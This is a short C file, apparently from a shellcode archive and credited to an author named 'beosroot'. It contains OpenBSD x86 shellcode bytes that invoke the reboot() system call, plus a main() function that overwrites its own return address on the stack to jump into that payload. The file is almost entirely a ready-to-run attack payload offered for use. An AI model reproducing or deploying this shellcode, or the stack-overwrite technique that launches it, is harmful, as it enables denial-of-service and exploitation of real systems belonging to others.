//   ----------bsd/x86 reboot() shellcode-----------------

//  AUTHOR : beosroot
//  INFO   : OpenBSD x86 reboot() shellcode
//  EMAIL :  beosroot@null.net
//           beosroot@hotmail.fr


char shellcode[] = "\x31\xc0\x66\xba\x0e\x27\x66\x81\xea\x06\x27\xb0\x37\xcd\x80";

int main() {

  int *ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}


// the end o.O